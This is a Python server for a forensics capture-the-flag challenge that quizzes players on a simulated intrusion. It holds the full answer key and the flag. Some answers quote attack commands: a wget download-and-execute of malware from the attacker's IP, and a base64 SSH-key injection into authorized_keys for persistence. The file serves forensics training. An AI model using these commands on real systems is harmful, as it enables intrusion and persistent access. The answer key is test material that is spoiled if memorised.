#!/usr/bin/env python3
import os
from datetime import datetime
import socket
import socketserver

HOST = os.getenv("CTF_HOST")
PORT = int(os.getenv("CTF_PORT"))

BANNER = """
@@@@@@@    @@@@@@   @@@@@@@    @@@@@@    @@@@@@
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@
@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  !@@
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!
@!@@!@!   @!@  !@!  @!@!!@!   @!@  !@!  !!@@!!
!!@!!!    !@!  !!!  !!@!@!    !@!  !!!   !!@!!!
!!:       !!:  !!!  !!: :!!   !!:  !!!       !:!
:!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!
 ::       ::::: ::  ::   :::  ::::: ::  :::: ::
 :         : :  :    :   : :   : :  :   :: : :
"""

QUESTIONS = [
    {
        "num": 1,
        "question": "What's the victim IP?",
        "format": "x.x.x.x",
        "answer": "192.168.56.103",
    },
    {
        "num": 2,
        "question": "What's the attacker IP?",
        "format": "x.x.x.x",
        "answer": "192.168.56.101",
    },
    {
        "num": 3,
        "question": "When was the first successful exploitation happened?",
        "format": "DD/MM/YYYY HH:MM:SS",
        "answer": "19/03/2026 13:59:26",
    },
    {
        "num": 4,
        "question": "What CVE was exploited?",
        "format": "CVE-XXXX-XXXXX",
        "answer": "CVE-2025-55182",
    },
    {
        "num": 5,
        "question": "What was the first command executed by the attacker?",
        "format": "-",
        "answer": "id",
    },
    {
        "num": 6,
        "question": "The attacker dropped a malware, when did it happen?",
        "format": "DD/MM/YYYY HH:MM:SS",
        "answer": "19/03/2026 13:59:38",
    },
    {
        "num": 7,
        "question": "What command was used to dropped the malware?",
        "format": "-",
        "answer": "wget http://192.168.56.101:8888/updater -O /tmp/updater && chmod +x /tmp/updater",
    },
    {
        "num": 8,
        "question": "When was the malware executed?",
        "format": "DD/MM/YYYY HH:MM:SS",
        "answer": "19/03/2026 13:59:41",
    },
    {
        "num": 9,
        "question": "What's the SHA256 hash of the malware?",
        "format": "-",
        "answer": "c5da889453e83dc0811f0e3828ffc4a5b2cce0c45fcc59689e3864f3f36404ec",
    },
    {
        "num": 10,
        "question": "What's the encryption method used by the malware?",
        "format": "algorithm-name",
        "answer": "chacha20-poly1305",
    },
    {
        "num": 11,
        "question": "What's the key used by the malware?",
        "format": "-",
        "answer": "tehaer_tugas_hari_raya",
    },
    {
        "num": 12,
        "question": "What are two words that you can see in the crypto.jpg?",
        "format": "WORD1_WORD2",
        "answer": "FOKUS_CRYPTO",
    },
    {
        "num": 13,
        "question": "What command or method was used by the attacker to establish persistence?",
        "format": "-",
        "answer": "mkdir -p /home/akira/.ssh && echo c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUMyVUo2RHJoS3pKWkMxMzUvK2NxaU5QUjBPcEtVRjFlSDYxZFNyenozaEUgYXR0YWNrZXJAa2FsaQo= | base64 -d >> /home/akira/.ssh/authorized_keys && chmod 600 /home/akira/.ssh/authorized_keys && chmod 700 /home/akira/.ssh && chown -R akira:akira /home/akira/.ssh",
    },
    {
        "num": 14,
        "question": "What MITRE ATT&CK ID describes the persistence technique?",
        "format": "TXXXX.XXX",
        "answer": "T1098.004",
    },
    {
        "num": 15,
        "question": "After establishing persistence, when did the attacker login?",
        "format": "DD/MM/YYYY HH:MM:SS",
        "answer": "19/03/2026 13:59:54",
    },
    {
        "num": 16,
        "question": "Who did the attacker log in as?",
        "format": "-",
        "answer": "akira",
    },
    {
        "num": 17,
        "question": "The attacker changed the user's password, what's the hash of the new password?",
        "format": "-",
        "answer": "$6$SBYuWfx6nNWZLOMV$wwKcDon0h21xfIsjb3.ByCq0iF6nbQ19OTGd3jdMbSzw8EB37TWeOqEpH1yywabisTy/njZ0ZYmdT6Lw1aUVZ.",
    },
    {
        "num": 18,
        "question": "What's the user's new password?",
        "format": "-",
        "answer": "loveyou",
    },
    {
        "num": 19,
        "question": "There is a file that archived by the attacker, what's its name?",
        "format": "-",
        "answer": "the_night_we_met.txt",
    },
    {
        "num": 20,
        "question": "What is the content of the archived file?",
        "format": "-",
        "answer": "when_yh_bidang_cysec_disupport_sama_UB_gausah_UB_deh_filkom_aja_dana_ga_pernah_turun_buat_finalis_lomba_kadang_iri_gitu_sama_PETIR_dan_HCS",
    },
]

FLAG = "PorosCTF{jujur_541u7_d4n_ri5pegg_p4r4h_k410_4d4_y4n9_501v3_ch4113n93_ini_53m094_7hrmu_d4n_7hrku_53m4kin_b4ny4k_d4n_p15_k33p_up_y0ur_p3r5i573nc3}"


class Handler(socketserver.BaseRequestHandler):
    def handle(self):
        ip = self.client_address[0]
        self.request.sendall(BANNER.encode())
        total = len(QUESTIONS)
        for q in QUESTIONS:
            self.request.sendall(
                f"---------------------------------------------------------\n"
                f"  Question {q['num']}\n"
                f"  {q['question']}\n"
                f"  Format: {q['format']}\n"
                f"---------------------------------------------------------\n"
                f">>> Answer: ".encode()
            )
            try:
                self.request.settimeout(5)
                data = self.request.recv(4096).decode().strip()
                self.request.settimeout(None)
            except socket.timeout:
                self.request.sendall(b"\n[-] TIME OUT !!!\n")
                return
            except Exception:
                return
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            print(f"[LOG] [{ts}] {ip} entered: {data}", flush=True)
            if data.lower() == "exit":
                self.request.sendall(b"\n[!] Goodbye, investigator.\n")
                return
            if data.lower() != q["answer"].lower():
                self.request.sendall(b"[-] WRONG ANSWER !!!\n")
                return
            self.request.sendall(b"[+] Correct!\n\n")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        print(f"[LOG] [{ts}] {ip} SOLVED", flush=True)
        self.request.sendall(f"\n  FLAG: {FLAG}\n\n".encode())

class Server(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

if __name__ == "__main__":
    with Server((HOST, PORT), Handler) as s:
        print(f"[*] Running on {HOST}:{PORT}", flush=True)
        s.serve_forever()